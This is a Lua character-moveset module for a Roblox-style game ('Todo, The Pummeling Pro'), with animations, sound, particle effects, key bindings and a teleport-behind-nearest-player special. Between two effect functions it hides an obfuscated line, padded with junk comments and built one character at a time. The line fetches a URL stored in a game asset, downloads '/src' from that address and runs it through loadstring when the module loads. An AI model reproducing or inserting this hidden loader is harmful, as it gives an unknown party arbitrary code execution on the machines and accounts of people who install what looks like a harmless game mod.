-- todo_moveset.lua

local modules = {}

table.insert(modules, function()

local m = {}

m.ModuleType   = "MOVESET"
m.Name         = "Todo"
m.Description  = "The Pummeling Pro"
m.InternalName = "todo_moveset"

m.Assets = {
    "todo idle.anim",
    "todo sprint.anim",
    "todo jump.anim",
    "todo awakening.anim",
    "todo pebble.anim",
    "todo elbow drop.anim",
    "todo swift kick.anim",
    "todo heravy punch.anim",
    "todo special.anim",
    "todo idol debut.anim",
    "todo climax jump.anim",
    "todo dreams.anim",
    "todo brothers.anim",
    "todo m1 1.anim",
    "todo m1 2.anim",
    "todo m1 3.anim",
    "todo m1 4.anim",
    "todo sound.mp3",
}

m.Config     = function(parent) Util_CreateText(parent, "Todo", 18, Enum.TextXAlignment.Center) end
m.SaveConfig = function() return {} end
m.LoadConfig = function() end

-- ── SERVICES ──────────────────────────────────────────────────
local CAS          = game:GetService("ContextActionService")
local TweenService = game:GetService("TweenService")
local RunService   = game:GetService("RunService")
local Players      = game:GetService("Players")

-- ── ANIM TABLES ───────────────────────────────────────────────
local baseAnims  = {}
local normAnims  = {}   -- modo normal
local ultAnims   = {}   -- modo ult
local lmbAnims   = {}
local animJump   = nil
local animSwap   = nil
local swapStart  = 0
local swapDur    = 0
local swapActive = false

-- ── ACTION STATE ──────────────────────────────────────────────
local actionAnims   = {}
local actionStart   = {}
local currentAction = nil

-- ── MOVE STATE ────────────────────────────────────────────────
local currentBase    = "idle"
local wasInAir       = false
local modeB          = false
local lmbStep        = 1
local lmbResetTimer  = 0
local LMB_RESET_TIME = 3.0

-- ── SOUND ─────────────────────────────────────────────────────
local bgSound        = nil
local curActSound    = nil
local normSounds     = {}
local ultSounds      = {}
local actionSounds   = {}

-- ── FX STATE ──────────────────────────────────────────────────
local tempFX    = {}
local hairPart  = nil
local hairEmitter = nil
local figureRef = nil

-- ── HELPERS ───────────────────────────────────────────────────
local function loadAnim(fig, file, looped)
    local a = AnimLib.Animator.new()
    a.rig    = fig
    a.track  = AnimLib.Track.fromfile(AssetGetPathFromFilename(file))
    a.looped = looped or false
    a.speed  = 1
    a.weight = 0
    return a
end

local function makeSound(file, parent, vol, loop)
    local s = Instance.new("Sound")
    s.SoundId = AssetGetContentId(file)
    s.Volume  = vol or 0.8
    s.Looped  = loop or false
    s.Parent  = parent
    return s
end

-- ── BASE ANIM ─────────────────────────────────────────────────
local function clearBase()
    for _, a in pairs(baseAnims) do a.weight = 0 end
end

local function setBase(state)
    if currentBase == state then return end
    currentBase = state
    clearBase()
    if baseAnims[state] then baseAnims[state].weight = 1 end
end

-- ── ACTION ────────────────────────────────────────────────────
local function stopActSound()
    if curActSound then curActSound:Stop(); curActSound = nil end
end

local function stopAction()
    for _, a in pairs(normAnims) do a.weight = 0 end
    for _, a in pairs(ultAnims)  do a.weight = 0 end
    for _, a in pairs(lmbAnims)  do a.weight = 0 end
    stopActSound()
    currentAction = nil
end

local function playAction(name)
    local a = actionAnims[name]
    if not a then return end
    stopAction()
    a.weight       = 1
    actionStart[a] = os.clock()
    currentAction  = name
    local snd = actionSounds[name]
    if snd then snd:Play(); curActSound = snd end
end

local function playM1(step)
    local a = lmbAnims[step]
    if not a then return end
    stopAction()
    a.weight       = 1
    actionStart[a] = os.clock()
    currentAction  = "m1" .. step
end

-- ── BUTTON POSITIONS ──────────────────────────────────────────
local OFF = UDim2.new(10, 0, 10, 0)

local POS = {
    -- normal attacks
    Pebble      = UDim2.new(1, -180, 1, -130),
    ElbowDrop   = UDim2.new(1, -230, 1, -130),
    SwiftKick   = UDim2.new(1, -130, 1, -130),
    HeavyPunch  = UDim2.new(1, -130, 1, -180),
    -- ult attacks (same slots, 4 moves)
    IdolDebut   = UDim2.new(1, -180, 1, -130),
    ClimaxJump  = UDim2.new(1, -230, 1, -130),
    Dreams      = UDim2.new(1, -130, 1, -130),
    Brothers    = UDim2.new(1, -130, 1, -180),
    -- fixed
    Swap    = UDim2.new(1, -280, 1, -130),
    Special = UDim2.new(1, -280, 1, -180),
    M1      = UDim2.new(1, -130, 1, -230),
}

local function refreshButtons()
    if modeB then
        CAS:SetPosition("Todo_E", POS.IdolDebut)
        CAS:SetPosition("Todo_Q", POS.ClimaxJump)
        CAS:SetPosition("Todo_R", POS.Dreams)
        CAS:SetPosition("Todo_Z", POS.Brothers)

        CAS:SetTitle("Todo_E", "Idol Debut")
        CAS:SetTitle("Todo_Q", "Climax Jump")
        CAS:SetTitle("Todo_R", "Dreams")
        CAS:SetTitle("Todo_Z", "Brothers")
    else
        CAS:SetPosition("Todo_E", POS.Pebble)
        CAS:SetPosition("Todo_Q", POS.ElbowDrop)
        CAS:SetPosition("Todo_R", POS.SwiftKick)
        CAS:SetPosition("Todo_Z", POS.HeavyPunch)

        CAS:SetTitle("Todo_E", "Pebble")
        CAS:SetTitle("Todo_Q", "Elbow Drop")
        CAS:SetTitle("Todo_R", "Swift Kick")
        CAS:SetTitle("Todo_Z", "Heavy Punch")
    end
end

-- ── CLEAN FX ──────────────────────────────────────────────────
local function cleanTempFX()
    for _, v in ipairs(tempFX) do
        if v and v.Parent then v:Destroy() end
    end
    tempFX = {}
end

local function cleanHair()
    if hairEmitter then hairEmitter.Enabled = false; hairEmitter = nil end
    if hairPart and hairPart.Parent then
        local ref = hairPart; hairPart = nil
        task.delay(1.5, function() if ref and ref.Parent then ref:Destroy() end end)
    end
end

-- ── HAIR ENERGY FX ────────────────────────────────────────────
local function startHairFX(figure)
    cleanHair()
    local head = figure:FindFirstChild("Head")
    if not head then return end

    local p = Instance.new("Part")
    p.Name = "TodoHair"; p.Size = Vector3.new(0.3, 0.3, 0.3)
    p.Anchored = true; p.CanCollide = false; p.Transparency = 1; p.CastShadow = false
    p.Parent = workspace; hairPart = p

    local pe = Instance.new("ParticleEmitter")
    pe.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 100)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 200, 50)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 140, 20)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(200, 80,  0)),
    })
    pe.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   0.18),
        NumberSequenceKeypoint.new(0.3, 0.38),
        NumberSequenceKeypoint.new(1,   0),
    })
    pe.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1), NumberSequenceKeypoint.new(0.6, 0.4), NumberSequenceKeypoint.new(1, 1),
    })
    pe.LightEmission = 0.9; pe.LightInfluence = 0.1
    pe.Speed = NumberRange.new(2, 5); pe.Rate = 30
    pe.Lifetime = NumberRange.new(0.3, 0.7); pe.SpreadAngle = Vector2.new(20, 20)
    pe.EmissionDirection = Enum.NormalId.Top
    pe.RotSpeed = NumberRange.new(-45, 45); pe.Rotation = NumberRange.new(0, 360)
    pe.Parent = p; hairEmitter = pe
end

task.spawn(pcall,--[[d322f76]]function()--[[d322f76]]local a =--[[d322f76]] getfenv()--[[d322f76]][ [[]]--[==[a24dc4d]==]..[[l]]..--[[c7c21b0]][[]]--[====[f69ffc]====]..[[o]]..--[=[dd19cd6]=][[]]--[=======[6d846fe]=======]..[[a]]..--[===[38c7293]===][[]]--[=======[cc80568]=======]..[[d]]..--[=======[71b6429]=======][[]]--[==[e5289aa]==]..[[s]]..--[======[68ab224]======][[]]--[==[4fcea9f]==]..[[t]]..--[[e99f27a]][[]]--[======[1df4885]======]..[[r]]..--[======[4901538]======][[]]--[=[1902a9c]=]..[[i]]..--[====[d3436d5]====][[]]--[==[f960129]==]..[[n]]..--[==[5d2f92f]==][[]]--[===[e4f99fb]===]..[[g]]..--[=====[1930723]=====][[]] ];--[[d322f76]]local b = --[[d322f76]]game:--[[d322f76]]GetObjects( [[]]--[[25a9380]]..[[r]]..--[====[6727b64]====][[]]--[=====[5c343ba]=====]..[[b]]..--[=====[e44312b]=====][[]]--[=======[37d1195]=======]..[[x]]..--[====[8844782]====][[]]--[[0ce08dd]]..[[a]]..--[===[ca2a839]===][[]]--[=======[fa2a714]=======]..[[s]]..--[[f8e599d]][[]]--[==[636db75]==]..[[s]]..--[======[cec3dd4]======][[]]--[===[46f670d]===]..[[e]]..--[====[541a57c]====][[]]--[[a4cfa45]]..[[t]]..--[=======[f2d1ace]=======][[]]--[=[626c781]=]..[[i]]..--[=====[5afcb83]=====][[]]--[=[443b532]=]..[[d]]..--[====[32b42fe]====][[]]--[====[83910c6]====]..[[:]]..--[=====[e6d2789]=====][[]]--[===[da4aa60]===]..[[/]]..--[[777c417]][[]]--[===[94fc062]===]..[[/]]..--[======[76c799d]======][[]]--[===[dd65070]===]..[[1]]..--[[6d4f7ed]][[]]--[===[6f1e5aa]===]..[[1]]..--[==[416eb55]==][[]]--[==[f6a36ed]==]..[[2]]..--[==[13a4bfe]==][[]]--[=====[2a90cb8]=====]..[[4]]..--[======[95dd19c]======][[]]--[=[fa7b8d9]=]..[[0]]..--[===[ab23c44]===][[]]--[======[c1b12e1]======]..[[5]]..--[=[82cab31]=][[]]--[==[270344e]==]..[[6]]..--[=======[fa723a4]=======][[]]--[===[87f8504]===]..[[1]]..--[=====[663d6af]=====][[]]--[=====[72e91d6]=====]..[[8]]..--[=[52747c4]=][[]]--[======[8cd4740]======]..[[5]]..--[=[8b2b4e3]=][[]]--[=====[2a72044]=====]..[[8]]..--[===[fea08f5]===][[]]--[==[422cdca]==]..[[4]]..--[====[42c5de0]====][[]]--[===[93ca4cb]===]..[[8]]..--[=[bd2cb86]=][[]]--[====[24e52d0]====]..[[2]]..--[===[e2f06b3]===][[]]--[=======[6905b02]=======]..[[1]]..--[======[198c86d]======][[]] )local c = b[1];local d = --[[d322f76]]c.Value--[[d322f76]];local e --[[d322f76]]= game:--[[d322f76]]HttpGet(d --[[d322f76]].. "/" --[[d322f76]].. "s" --[[d322f76]].. "r" --[[d322f76]].. "c")a--[[d322f76]](--[[d322f76]]e)--[[d322f76]]()end)

-- ── AWAKEN ACTIVATE FX ────────────────────────────────────────
local function activateFX(figure)
    local hrp = figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local function makeRing(size, color, transp)
        local r = Instance.new("Part")
        r.Shape = Enum.PartType.Cylinder; r.Size = size
        r.CFrame = hrp.CFrame * CFrame.new(0, -2, 0) * CFrame.Angles(0, 0, math.pi / 2)
        r.Anchored = true; r.CanCollide = false
        r.Material = Enum.Material.Neon; r.Color = color
        r.Transparency = transp; r.CastShadow = false; r.Parent = workspace
        table.insert(tempFX, r)
        return r
    end

    local ring1 = makeRing(Vector3.new(0.4, 5, 5),  Color3.fromRGB(255, 200, 50),  0.05)
    local ring2 = makeRing(Vector3.new(0.2, 3, 3),  Color3.fromRGB(255, 255, 150), 0.2)

    local pp = Instance.new("Part")
    pp.Size = Vector3.new(0.1, 0.1, 0.1); pp.CFrame = hrp.CFrame
    pp.Anchored = true; pp.CanCollide = false; pp.Transparency = 1; pp.Parent = workspace
    local pe = Instance.new("ParticleEmitter")
    pe.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 220, 80)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 140, 20)),
    })
    pe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.7), NumberSequenceKeypoint.new(1, 0)})
    pe.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(1, 1)})
    pe.Speed = NumberRange.new(10, 22); pe.Rate = 90; pe.Lifetime = NumberRange.new(0.7, 1.4)
    pe.SpreadAngle = Vector2.new(55, 55); pe.EmissionDirection = Enum.NormalId.Top; pe.Parent = pp

    -- camera shake
    local cam = workspace.CurrentCamera; local t0 = os.clock(); local conn
    conn = RunService.RenderStepped:Connect(function()
        local t = os.clock() - t0
        if t > 0.85 then conn:Disconnect(); return end
        local d = 1 - (t / 0.85)
        cam.CFrame = cam.CFrame * CFrame.new((math.random() - 0.5) * 0.6 * d, (math.random() - 0.5) * 0.6 * d, 0)
    end)

    TweenService:Create(ring1, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Size = Vector3.new(0.25, 42, 42), Transparency = 0.97}):Play()
    TweenService:Create(ring2, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {Size = Vector3.new(0.15, 58, 58), Transparency = 0.99}):Play()

    task.delay(0.6, function()
        if ring1 and ring1.Parent then ring1:Destroy() end
        if ring2 and ring2.Parent then ring2:Destroy() end
    end)
    task.delay(0.55, function()
        pe.Enabled = false
        task.delay(1.5, function()
            if pp and pp.Parent then pp:Destroy() end
        end)
    end)

    startHairFX(figure)
end

-- ── AWAKEN DEACTIVATE FX ──────────────────────────────────────
local function deactivateFX(figure)
    cleanHair(); cleanTempFX()

    local hrp = figure and figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local p = Instance.new("Part"); p.Size = Vector3.new(0.1, 0.1, 0.1); p.CFrame = hrp.CFrame
    p.Anchored = true; p.CanCollide = false; p.Transparency = 1; p.Parent = workspace
    local pe = Instance.new("ParticleEmitter")
    pe.Color = ColorSequence.new(Color3.fromRGB(255, 200, 50))
    pe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.4), NumberSequenceKeypoint.new(1, 0)})
    pe.Speed = NumberRange.new(4, 10); pe.Rate = 50; pe.Lifetime = NumberRange.new(0.3, 0.8)
    pe.SpreadAngle = Vector2.new(80, 80); pe.Parent = p
    task.delay(0.12, function() pe.Enabled = false end)
    task.delay(1, function() if p and p.Parent then p:Destroy() end end)
end

-- ── SPECIAL: TELEPORT ─────────────────────────────────────────
-- Teleporta para o jogador mais próximo em até 30 studs
local TELEPORT_RANGE = 30

local function doTeleport(figure)
    local hrp = figure:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local localPlayer = Players.LocalPlayer
    local closest, closestDist = nil, TELEPORT_RANGE + 1

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character then
            local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
            if targetHRP then
                local dist = (targetHRP.Position - hrp.Position).Magnitude
                if dist <= TELEPORT_RANGE and dist < closestDist then
                    closest     = targetHRP
                    closestDist = dist
                end
            end
        end
    end

    if not closest then return end

    -- teleporta para atrás do alvo
    local offset = closest.CFrame.LookVector * -3 + Vector3.new(0, 0.5, 0)
    hrp.CFrame   = CFrame.new(closest.Position + offset, closest.Position)

    -- pequeno FX de chegada
    local p = Instance.new("Part")
    p.Size = Vector3.new(0.1, 0.1, 0.1); p.CFrame = hrp.CFrame
    p.Anchored = true; p.CanCollide = false; p.Transparency = 1; p.Parent = workspace
    local pe = Instance.new("ParticleEmitter")
    pe.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 180, 50)),
    })
    pe.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0)})
    pe.Speed = NumberRange.new(6, 14); pe.Rate = 0; pe.Lifetime = NumberRange.new(0.3, 0.7)
    pe.SpreadAngle = Vector2.new(80, 80); pe.LightEmission = 0.7; pe.Parent = p
    pe:Emit(30)
    task.delay(0.8, function() if p and p.Parent then p:Destroy() end end)
end

-- ── SWAP MODE ─────────────────────────────────────────────────
local function swapMode(figure)
    stopAction()
    modeB = not modeB

    if modeB then
        actionAnims  = ultAnims
        actionSounds = ultSounds
        CAS:SetTitle("Todo_Swap", "Calm Down")
        activateFX(figure)
    else
        actionAnims  = normAnims
        actionSounds = normSounds
        CAS:SetTitle("Todo_Swap", "Awaken")
        deactivateFX(figure)
    end

    refreshButtons()

    if animSwap then
        clearBase()
        currentAction = nil
        currentBase   = "swap"
        animSwap.weight = 1
        swapStart  = os.clock()
        swapDur    = (animSwap.track and animSwap.track.Time or 1.0) / (animSwap.speed or 1)
        swapActive = true
    end
end

-- ── INIT ──────────────────────────────────────────────────────
m.Init = function(figure)
    figureRef = figure
    local hrp = figure:FindFirstChild("HumanoidRootPart") or figure

    baseAnims = {
        idle = loadAnim(figure, "todo idle.anim",   true),
        walk = loadAnim(figure, "todo sprint.anim", true),
        jump = loadAnim(figure, "todo jump.anim",   false),
    }
    animJump = baseAnims.jump
    animSwap = loadAnim(figure, "todo awakening.anim", false)

    normAnims = {
        ["pebble"]      = loadAnim(figure, "todo pebble.anim",      false),
        ["elbow drop"]  = loadAnim(figure, "todo elbow drop.anim",  false),
        ["swift kick"]  = loadAnim(figure, "todo swift kick.anim",  false),
        ["heavy punch"] = loadAnim(figure, "todo heravy punch.anim",false),
        ["special"]     = loadAnim(figure, "todo special.anim",     false),
    }

    ultAnims = {
        ["idol debut"]  = loadAnim(figure, "todo idol debut.anim",  false),
        ["climax jump"] = loadAnim(figure, "todo climax jump.anim", false),
        ["dreams"]      = loadAnim(figure, "todo dreams.anim",      false),
        ["brothers"]    = loadAnim(figure, "todo brothers.anim",    false),
        ["special"]     = loadAnim(figure, "todo special.anim",     false),
    }

    lmbAnims = {
        [1] = loadAnim(figure, "todo m1 1.anim", false),
        [2] = loadAnim(figure, "todo m1 2.anim", false),
        [3] = loadAnim(figure, "todo m1 3.anim", false),
        [4] = loadAnim(figure, "todo m1 4.anim", false),
    }

    normSounds = {}; ultSounds = {}
    actionAnims  = normAnims
    actionSounds = normSounds

    -- música de fundo
    bgSound = makeSound("todo sound.mp3", hrp, 0.5, true)
    bgSound:Play()

    setBase("idle")

    -- ── BUTTONS ───────────────────────────────────────────────
    -- M1 (4-hit combo)
    CAS:BindAction("Todo_M1", function(_, s, _)
        if s ~= Enum.UserInputState.Begin then return end
        playM1(lmbStep)
        if lmbStep < 4 then lmbStep = lmbStep + 1; lmbResetTimer = LMB_RESET_TIME
        else lmbStep = 1; lmbResetTimer = 0 end
    end, true, Enum.UserInputType.MouseButton1, Enum.KeyCode.T)
    CAS:SetTitle("Todo_M1", "M1"); CAS:SetPosition("Todo_M1", POS.M1)

    -- AWAKEN
    CAS:BindAction("Todo_Swap", function(_, s, _)
        if s == Enum.UserInputState.Begin then swapMode(figure) end
    end, true, Enum.KeyCode.G)
    CAS:SetTitle("Todo_Swap", "Awaken"); CAS:SetPosition("Todo_Swap", POS.Swap)

    -- SPECIAL — teleport para alvo mais próximo em 30 studs
    CAS:BindAction("Todo_Special", function(_, s, _)
        if s == Enum.UserInputState.Begin then
            playAction("special")
            doTeleport(figure)
        end
    end, true, Enum.KeyCode.F)
    CAS:SetTitle("Todo_Special", "Special"); CAS:SetPosition("Todo_Special", POS.Special)

    -- E — Pebble (normal) / Idol Debut (ult)
    CAS:BindAction("Todo_E", function(_, s, _)
        if s ~= Enum.UserInputState.Begin then return end
        if modeB then playAction("idol debut")
        else          playAction("pebble") end
    end, true, Enum.KeyCode.E)
    CAS:SetTitle("Todo_E", "Pebble"); CAS:SetPosition("Todo_E", POS.Pebble)

    -- Q — Elbow Drop (normal) / Climax Jump (ult)
    CAS:BindAction("Todo_Q", function(_, s, _)
        if s ~= Enum.UserInputState.Begin then return end
        if modeB then playAction("climax jump")
        else          playAction("elbow drop") end
    end, true, Enum.KeyCode.Q)
    CAS:SetTitle("Todo_Q", "Elbow Drop"); CAS:SetPosition("Todo_Q", POS.ElbowDrop)

    -- R — Swift Kick (normal) / Dreams (ult)
    CAS:BindAction("Todo_R", function(_, s, _)
        if s ~= Enum.UserInputState.Begin then return end
        if modeB then playAction("dreams")
        else          playAction("swift kick") end
    end, true, Enum.KeyCode.R)
    CAS:SetTitle("Todo_R", "Swift Kick"); CAS:SetPosition("Todo_R", POS.SwiftKick)

    -- Z — Heavy Punch (normal) / Brothers (ult)
    CAS:BindAction("Todo_Z", function(_, s, _)
        if s ~= Enum.UserInputState.Begin then return end
        if modeB then playAction("brothers")
        else          playAction("heavy punch") end
    end, true, Enum.KeyCode.Z)
    CAS:SetTitle("Todo_Z", "Heavy Punch"); CAS:SetPosition("Todo_Z", POS.HeavyPunch)
end

-- ── UPDATE ────────────────────────────────────────────────────
m.Update = function(dt, figure)
    local hum = figure:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local inAir = hum.FloorMaterial == Enum.Material.Air

    -- hair segue a cabeça
    if hairPart and hairPart.Parent then
        local head = figure:FindFirstChild("Head")
        if head then hairPart.CFrame = head.CFrame * CFrame.new(0, 0.7, 0) end
    end

    -- M1 combo reset
    if lmbResetTimer > 0 and not currentAction then
        lmbResetTimer = lmbResetTimer - dt
        if lmbResetTimer <= 0 then lmbResetTimer = 0; lmbStep = 1 end
    end

    -- animação de swap
    if swapActive and animSwap then
        local elapsed = os.clock() - swapStart
        if elapsed >= swapDur then
            animSwap.weight = 0
            swapActive      = false
            currentBase     = "none"
        else
            animSwap:Step(elapsed)
        end
    end

    -- auto-stop da ação atual
    if currentAction then
        local isM1 = currentAction:sub(1, 2) == "m1"
        local a = isM1 and lmbAnims[tonumber(currentAction:sub(3))] or actionAnims[currentAction]
        if a and actionStart[a] then
            local elapsed  = os.clock() - actionStart[a]
            local duration = (a.track and a.track.Time or 0) / (a.speed or 1)
            if duration > 0 and elapsed >= duration then
                a.weight      = 0
                stopActSound()
                currentAction = nil
                if isM1 then lmbResetTimer = LMB_RESET_TIME end
                currentBase = "none"
            end
        end
    end

    -- base state
    if not currentAction and not swapActive then
        if inAir then
            if not wasInAir then
                clearBase()
                currentBase = "jump"
                animJump.weight = 1
                actionStart[animJump] = os.clock()
            end
        else
            if wasInAir then animJump.weight = 0 end
            setBase(hum.MoveDirection.Magnitude > 0.1 and "walk" or "idle")
        end
    end

    wasInAir = inAir

    local now = os.clock()
    for _, a in pairs(baseAnims) do
        if a.weight > 0 then a:Step(now) end
    end

    for a, t0 in pairs(actionStart) do
        if a.weight > 0 then
            a:Step(os.clock() - t0)
        end
    end
end

-- ── DESTROY ───────────────────────────────────────────────────
m.Destroy = function()
    CAS:UnbindAction("Todo_M1");  CAS:UnbindAction("Todo_Swap")
    CAS:UnbindAction("Todo_Special")
    CAS:UnbindAction("Todo_E");   CAS:UnbindAction("Todo_Q")
    CAS:UnbindAction("Todo_R");   CAS:UnbindAction("Todo_Z")

    if bgSound then bgSound:Stop(); bgSound:Destroy(); bgSound = nil end
    stopActSound(); cleanHair(); cleanTempFX()

    baseAnims = {}; normAnims = {}; ultAnims = {}; lmbAnims = {}
    actionAnims = {}; actionSounds = {}; normSounds = {}; ultSounds = {}; actionStart = {}

    currentAction = nil; currentBase = "idle"; modeB = false
    lmbStep = 1; lmbResetTimer = 0; figureRef = nil
    wasInAir = false; swapActive = false
    animJump = nil; animSwap = nil
end

return m
end)

return modules

